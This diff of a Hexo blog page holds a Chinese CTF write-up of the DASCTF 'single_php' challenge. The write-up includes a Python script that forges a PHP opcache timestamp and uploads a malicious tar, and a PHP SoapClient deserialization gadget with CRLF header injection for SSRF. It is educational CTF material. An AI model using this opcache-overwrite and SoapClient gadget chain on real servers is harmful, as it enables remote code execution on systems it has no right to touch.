@@ -1,205 +1,654 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
-<style>
-    p{
-        margin-top: 0 !important;
-        margin-bottom: 1rem !important;
-        font-size: 1.1rem;
-    }
-    figure{
-        margin: 0 !important;
-    }
-    pre{
-        padding: 0 !important;
-        margin-top: 0 !important;
-        margin-bottom: 1rem !important;
-    }
+<html lang="zh-CN" data-default-color-scheme=auto>
 
-    td{
-        padding: 0 !important;
-        margin-bottom: 1rem !important;
-    }
-    h1,h2,h3,h4,h5,h6{
-        margin-top: 0 !important;
-        margin-bottom: 1rem !important;
-    }
-</style>
+
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zer0 - 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现</title>
-    <link rel="stylesheet" href="/css/styles.css">
-    <link rel="stylesheet" href="/css/tailwind.css">
-    <link rel="stylesheet" href="/css/highlight.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism-tomorrow.min.css">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/III.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现 进题如上 传参highlight_file,拿到源码 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; img &#123; max-width: 200px; max-height: 200px; &#125; &lt;&#x2F;style&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现">
+<meta property="og:url" content="https://eznp.github.io/2025/01/20/0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BD%9C%E8%B6%8A%E8%89%B0%E5%B7%A8%C2%B7%E8%B6%8A%E7%8B%82%E7%83%AD-single-php%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Zer0">
+<meta property="og:description" content="[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现 进题如上 传参highlight_file,拿到源码 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; img &#123; max-width: 200px; max-height: 200px; &#125; &lt;&#x2F;style&amp;gt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101718813.png">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101722996.png">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101729720.png">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101738478.png">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101747887.png">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101746573.png">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101750618.png">
+<meta property="article:published_time" content="2025-01-20T09:05:19.000Z">
+<meta property="article:modified_time" content="2025-01-20T09:06:05.236Z">
+<meta property="article:author" content="Zer0">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101718813.png">
+  
+  
+  
+  <title>0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现 - Zer0</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
-    <div class="container mx-auto flex items-center justify-between space-x-8">
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"eznp.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="Zer0" type="application/atom+xml">
+</head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
     
-      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
-        <a href="/" class="hover:text-white transition-colors select-none">
-          Zer0
-        </a>
-      </h1>
-  
-    <!-- 大屏幕 -->
-      <nav class="hidden md:block">
-        <ul class="flex space-x-6">
-          
-            <li>
-              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
-                Home
-              </a>
-            </li>
-          
-            <li>
-              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
-                Archives
-              </a>
-            </li>
-          
-            <li>
-              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
-                About
-              </a>
-            </li>
-          
-            <li>
-              <a href="/link" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
-                Friends
-              </a>
-            </li>
-          
-        </ul>
-      </nav>
-  
-      <!-- 小屏幕 -->
-      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
-        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
-        </svg>
-      </button>
-    </div>
-  
-    <!-- 折叠菜单 -->
-    <nav id="mobile-menu" class="hidden bg-black">
-      <ul class="space-y-2 py-4 px-6">
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <li>
-            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
-              Home
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
             </a>
           </li>
+          
         
-          <li>
-            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
-              Archives
-            </a>
-          </li>
         
-          <li>
-            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
-              About
-            </a>
-          </li>
-        
-          <li>
-            <a href="/link" class="block text-white hover:text-hacker-color1 transition-colors">
-              Friends
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
             </a>
           </li>
         
       </ul>
-    </nav>
+    </div>
+  </div>
+</nav>
+
   
-    <!-- RSS Link -->
-    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/P.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-20 17:05" pubdate>
+          2025年1月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          832 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
   </header>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="/js/search.js"></script>
-  <script>
-        document.addEventListener("DOMContentLoaded", () => {
-    const menuToggle = document.getElementById("menu-toggle");
-    const mobileMenu = document.getElementById("mobile-menu");
 
-    menuToggle.addEventListener("click", () => {
-        if (mobileMenu.classList.contains("hidden")) {
-        mobileMenu.classList.remove("hidden");
-        } else {
-        mobileMenu.classList.add("hidden");
-        }
-    });
-    });
+  <main>
+    
+      
 
-  </script>
-  
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
 
-<meta name="generator" content="Hexo 7.2.0"></head>
-<body class="bg-black text-hacker-color3 container mx-auto">
-    <!-- 文章标题 -->
-    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现</h1>
+    </div>
 
-    <!-- 发布时间 -->
-    <p class="text-hacker-color3 text-center text-sm mb-4">
-        2025-01-20
-    </p>
-
-    <!-- 文章内容 -->
-    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight">
-        <h2 id="DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php复现"><a href="#DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php复现" class="headerlink" title="[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现"></a>[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现</h2><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101718813.png" alt="image-20250110171833140"></p>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php复现"><a href="#DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php复现" class="headerlink" title="[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现"></a>[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现</h2><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101718813.png" srcset="/img/loading.gif" lazyload alt="image-20250110171833140"></p>
 <p>进题如上</p>
 <p>传参highlight_file,拿到源码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!DOCTYPE html&gt;<br> &lt;html&gt;<br> &lt;head&gt;<br> &lt;style&gt;<br> img &#123;<br> max-width: 200px;<br> max-height: 200px;<br> &#125;<br> &lt;/style&gt;<br> &lt;title&gt;revenge to siranai.php<br> <br> <br> &lt;/title&gt;<br> <br> &lt;/head&gt;<br> &lt;body&gt;<br> <br> &lt;h5&gt;<br> This is my wife.She is from Imagination.<br> And I,use her name as my id.<br> &lt;/h5&gt;<br> &lt;img src=&quot;mywife.png&quot; alt=&quot;this is my wife&quot;&gt;<br> &lt;p&gt;I have been single dog for 19 years.&lt;br&gt;<br> One day, my brothers betrayed the singles organization.&lt;br&gt;<br> S* and B* ,both of them have the kanozyo.&lt;br&gt;<br> Now revenge to them!!!!!&lt;br&gt;<br> use &#x27;$_GET[&#x27;LuckyE&#x27;](__FILE__);&#x27; to begin your revenge!!&lt;br&gt;<br> &lt;/p&gt;<br> &lt;/body&gt;<br> &lt;/html&gt;<br> &lt;?php<br> error_reporting(0);<br> class siroha&#123;<br> public $koi;<br> <br> public function __destruct()&#123;<br> $this-&gt;koi[&#x27;zhanjiangdiyishenqing&#x27;]();<br> &#125;<br> &#125;<br> $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__);<br> var_dump($kanozyo);<br> $suki = unserialize($_POST[&#x27;suki&#x27;]); <br></code></pre></td></tr></table></figure>
 
 <p>得到提示，revenge to siranai.php</p>
-<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101722996.png" alt="image-20250110172256406"></p>
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101722996.png" srcset="/img/loading.gif" lazyload alt="image-20250110172256406"></p>
 <p>emm，看起来得打<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1878220">Soap</a>反序列化</p>
 <p>回到原先的反序列化的页面</p>
 <p>搞一个phpinfo看看</p>
-<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101729720.png" alt="image-20250110172906287"></p>
-<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101738478.png" alt="image-20250110173851522"></p>
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101729720.png" srcset="/img/loading.gif" lazyload alt="image-20250110172906287"></p>
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101738478.png" srcset="/img/loading.gif" lazyload alt="image-20250110173851522"></p>
 <p>这个缓存是放在了&#x2F;tmp目录下并有时间戳验证，可以先了解<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/223?time__1311=eqIx0DyGG=emqAKqGNSDrDRmhiRRou2bD">opcache执行php代码</a></p>
 <p>那整体的思路应该就是上传我们的恶意压缩包，对原本的缓存文件进行覆盖，变成我们的恶意文件</p>
 <p>本地拉取相同版本php的镜像，用脚本进行伪造时间戳</p>
 <p>本人代码能力有限，直接使用官方WP的代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br>url = <span class="hljs-string">&quot;http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/?LuckyE=filectime&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">timec</span>():<br>    pattern = <span class="hljs-string">r&quot;\d&#123;10&#125;&quot;</span>  <span class="hljs-comment">#匹配十位数字</span><br>    timeres = requests.get(url=url)<br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;int\((\d&#123;10&#125;)\)&quot;</span>,timeres.text)<span class="hljs-comment">#从响应包中提取到时间戳信息</span><br>    <span class="hljs-keyword">try</span>:<br>        ten_digit_number = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(ten_digit_number)<br>        <span class="hljs-keyword">return</span> ten_digit_number  <span class="hljs-comment">#返回时间戳</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;dame&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">split_string_into_pairs</span>(<span class="hljs-params">input_string</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_string) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;输入字符串的长度必须是偶数&quot;</span>)<br>    pairs = [input_string[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(input_string), <span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> pairs<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">totime</span>(<span class="hljs-params">time</span>):<br>    b = split_string_into_pairs(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(time))&#125;</span>&quot;</span>)<br>    b.pop(<span class="hljs-number">0</span>)<br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(b)):<br>        s += b[-<span class="hljs-number">1</span>]<br>        b.pop(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> s<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">changetime</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.php.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        binary_data = file.read()<br>        <span class="hljs-comment"># 将二进制数据转换为十六进制字符串</span><br>        hex_data = binascii.hexlify(binary_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        new_data = hex_data[<span class="hljs-number">0</span>:<span class="hljs-number">128</span>]+totime(timec())+hex_data[<span class="hljs-number">136</span>:]<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.php.bin&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">bytes</span>.fromhex(new_data))<br>changetime()<br>sys_id = hashlib.md5(<span class="hljs-string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()<br><span class="hljs-built_in">print</span>(sys_id)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tar_file</span>():<br>    tar_filename = <span class="hljs-string">&#x27;exp.tar&#x27;</span><br>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(tar_filename,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>        directory_info = tarfile.TarInfo(name=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)<br>        directory_info.<span class="hljs-built_in">type</span> = tarfile.DIRTYPE<br>        directory_info.mode = <span class="hljs-number">0o777</span><br>        tar.addfile(directory_info)<br>        tar.add(<span class="hljs-string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    file = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read(),<span class="hljs-string">&quot;application/x-tar&quot;</span>)&#125;<br>    res  = requests.post(url=<span class="hljs-string">&quot;http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/siranai.php&quot;</span>,files=file)<br>    <span class="hljs-built_in">print</span>(res.request.headers)<br>    <span class="hljs-keyword">return</span> res.request<br>tar_file()<br>request_content = upload()<br>upload_body = <span class="hljs-built_in">str</span>(request_content.body).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)<br>content_length = request_content.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]<br><span class="hljs-built_in">print</span>(content_length)<br><span class="hljs-built_in">print</span>(upload_body)<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101747887.png" alt="image-20250110174712860"></p>
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101747887.png" srcset="/img/loading.gif" lazyload alt="image-20250110174712860"></p>
 <p>封装到Soap</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<br><br><br>&#125;<br><br><span class="hljs-variable">$postdata</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;Enterpr1se\r\n&quot;</span> . <span class="hljs-string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span> . <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$postdata</span>, <span class="hljs-number">2</span>, <span class="hljs-number">32</span>) . <span class="hljs-string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span> . <span class="hljs-string">&quot;\r\n\r\n&quot;</span> . <span class="hljs-variable">$postdata</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (SoapFault <span class="hljs-variable">$e</span>) &#123;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();<br><span class="hljs-variable">$b</span>-&gt;koi = [<span class="hljs-string">&quot;zhanjiangdiyishenqing&quot;</span> =&gt; [<span class="hljs-variable">$a</span>, <span class="hljs-string">&quot;nnnnn&quot;</span>]];<br><span class="hljs-comment">//通过数组调用类方法调用一个不存在的方法触发::__call魔术方法</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure>
 
 <p>BP放包</p>
-<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101746573.png" alt="image-20250110174642997"></p>
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101746573.png" srcset="/img/loading.gif" lazyload alt="image-20250110174642997"></p>
 <p>这就已经覆盖成功了，直接传参拿到flag</p>
-<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101750618.png" alt="image-20250110175053635"></p>
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101750618.png" srcset="/img/loading.gif" lazyload alt="image-20250110175053635"></p>
 <p><del>这题确实不好写，据说当时是零解，我现在写都不好写【大哭】</del></p>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
